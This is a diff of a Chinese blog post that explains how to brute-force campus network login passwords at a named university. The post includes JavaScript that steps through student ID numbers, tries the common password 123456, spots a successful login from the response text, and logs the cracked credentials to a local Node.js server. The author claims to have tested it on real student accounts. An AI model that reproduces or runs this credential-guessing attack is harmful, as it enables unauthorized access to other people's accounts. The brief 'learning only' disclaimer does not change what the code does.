@@ -1,7 +1,7 @@
 
     <div style="padding:0 10px;"><p style="line-height:" 1.5em;="">好久没有写点东西了.好久不见,这一期我们让Nodejs配合前端来破解校园网密码.(注:Nodejs并不是必须的,只是用来存储密码.所以不会Nodejs也是木有关系的).当然,破解仅用于学习,我们要从中学习抵御攻击的方法,而不是要攻击他人.</p>
-        <p style="line-height:" 1.5em;=""><img src="http://img.baidu.com/hi/jx2/j_0037.gif">&nbsp;下面是测试时的截图(测试257账号中就有4个人使用了123456这个密码,所以大家以后多注意啊不要用这么大众的密码...)</p>
-        <p style="line-height:" 1.5em;=""><img src="http://nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440846847119602.png" title="1440846847119602.png" alt="QQ截图20150829191257.png"></p></div>
+        <p style="line-height:" 1.5em;=""><img src="//img.baidu.com/hi/jx2/j_0037.gif">&nbsp;下面是测试时的截图(测试257账号中就有4个人使用了123456这个密码,所以大家以后多注意啊不要用这么大众的密码...)</p>
+        <p style="line-height:" 1.5em;=""><img src="//nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440846847119602.png" title="1440846847119602.png" alt="QQ截图20150829191257.png"></p></div>
 
 
 		<span class="content" style="display:none;">
@@ -15,19 +15,19 @@
 <hr>
 <p style="line-height:" 1.5em;="">我们首先看真实的登陆场景.</p>
 <p style="line-height:" 1.5em;=""><span style="line-height:" 24px;="">因为登陆过程不需要验证码,而且密码是六位数字,所以我就想很大可能有漏洞.然后我们看一下真实登陆的过程后面隐藏着什么..</span></p>
-<p style="line-height:" 1.5em;=""><img src="http://nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440847346132253.png" title="1440847346132253.png" alt="blob.png"></p>
+<p style="line-height:" 1.5em;=""><img src="//nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440847346132253.png" title="1440847346132253.png" alt="blob.png"></p>
 <p style="line-height:" 1.5em;=""><br></p>
-<p style="line-height:" 1.5em;=""><img src="http://nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440847590707614.png" title="1440847590707614.png" alt="blob.png" width="400" height="360" style="width:" 400px;="" height:="" 360px;=""></p>
+<p style="line-height:" 1.5em;=""><img src="//nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440847590707614.png" title="1440847590707614.png" alt="blob.png" width="400" height="360" style="width:" 400px;="" height:="" 360px;=""></p>
 <p style="line-height:" 1.5em;="">从登陆的http请求来看,看来只是简单的把用户名与密码传给服务器,(0MKKey字段是木有作用的,至少对于用户验证来说).</p>
 <p style="line-height:" 1.5em;="">从请求的字段上来看,服务端并没有与客户端进行类似非对称密钥的用户验证.好吧,其实很多学校的网站都是外包给外满公司做的,而外包的质量.....</p>
 <p style="line-height:" 1.5em;="">那么如何破解呢?</p>
 <p style="line-height:" 1.5em;="">我们假设:现在我的学号是20121234, 密码是:123.</p>
 <p style="line-height:" 1.5em;="">我们先用这个登陆, 查看服务端返回什么内容(如图):</p>
 <p style="line-height:" 1.5em;="">服务端返回HTML..</p>
-<p style="line-height:" 1.5em;=""><img src="http://nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440851308646595.png" title="1440851308646595.png" alt="blob.png" width="415" height="260" style="width:" 415px;="" height:="" 260px;=""></p>
+<p style="line-height:" 1.5em;=""><img src="//nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440851308646595.png" title="1440851308646595.png" alt="blob.png" width="415" height="260" style="width:" 415px;="" height:="" 260px;=""></p>
 <p style="line-height:" 1.5em;="">我们在用相同的学号,换个456密码看看服务端返回什么:</p>
 <p style="line-height:" 1.5em;="">What the f... 还是HTML...</p>
-<p style="line-height:" 1.5em;=""><img src="http://nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440851411677492.png" title="1440851411677492.png" alt="blob.png" width="418" height="219" style="width:" 418px;="" height:="" 219px;=""></p>
+<p style="line-height:" 1.5em;=""><img src="//nigeerhuo-public.oss-cn-shanghai.aliyuncs.com/images/ueditor/php/upload/image/20150829/1440851411677492.png" title="1440851411677492.png" alt="blob.png" width="418" height="219" style="width:" 418px;="" height:="" 219px;=""></p>
 <p style="line-height:" 1.5em;="">那么我们在尝试暴力破解密码的时候,怎么知道自己尝试的&nbsp;<em>用户名与密码&nbsp;</em>是否匹配呢?</p>
 <p style="line-height:" 1.5em;="">别急,其实这俩个返回的HTML肯定是不同的(因为一个登陆正确,一个登陆错误啊...).</p>
 <p style="line-height:" 1.5em;="">我们要找到其中不同的地方.比如成功时,我们学校返回的HTML中有 <em>您已经成功登录 这几个字,</em>那么我只要在代码中这样写:</p>
@@ -37,10 +37,10 @@
 //&nbsp;&nbsp;不管成功与否,继续暴力破解...</pre>
 <p style="line-height:" 1.5em;="">所以说,表面上一个登陆界面,但却因为缺少用户认证机制,而成为一个开放的<strong>测试密码与用户名是否匹配</strong> 的服务端接口...</p>
 <p style="line-height:" 1.5em;="">具体代码可以跳转到<a href="https://github.com/AJLoveChina/Hacker/tree/master/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E9%99%86%E7%A0%B4%E8%A7%A3" target="_blank">Github</a>,或者核心的逻辑都在下面.</p>
-<pre class="brush:js;toolbar:false">//&nbsp;http://bkjw.hfut.edu.cn/student/photo/2012/201221xxxx.JPG
+<pre class="brush:js;toolbar:false">//&nbsp;//bkjw.hfut.edu.cn/student/photo/2012/201221xxxx.JPG
 var&nbsp;prop&nbsp;=&nbsp;{};
 //&nbsp;校园网登陆请求发送的url地址
-prop.url&nbsp;=&nbsp;http://172.16.200.11/;
+prop.url&nbsp;=&nbsp;//172.16.200.11/;
 //&nbsp;我们初始从这个学号开始
 prop.name&nbsp;=&nbsp;2012210000;
 //&nbsp;我们初始尝试&nbsp;这个123456&nbsp;密码,&nbsp;据统计这个密码在本校2012级5500人中,有26人使用,频率非常高.
@@ -49,7 +49,7 @@ prop.type&nbsp;=&nbsp;'POST';
 prop.timeout&nbsp;=&nbsp;1000/24;
 prop.save&nbsp;=&nbsp;function&nbsp;(str)&nbsp;{
 &nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这个函数是与nodejs交互的模块,把抓取到的密码通过发送一个http请求,然后被nodejs脚本保存到文件中
-&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;url&nbsp;=&nbsp;http://127.0.0.1:520/?&nbsp;+&nbsp;str;
+&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;url&nbsp;=&nbsp;//127.0.0.1:520/?&nbsp;+&nbsp;str;
 &nbsp;&nbsp;&nbsp;&nbsp;document.body.innerHTML&nbsp;+=&nbsp;&lt;img&nbsp;src='&nbsp;+&nbsp;url&nbsp;+&nbsp;'&gt;;
 }
 prop.tryNext&nbsp;=&nbsp;function&nbsp;()&nbsp;{
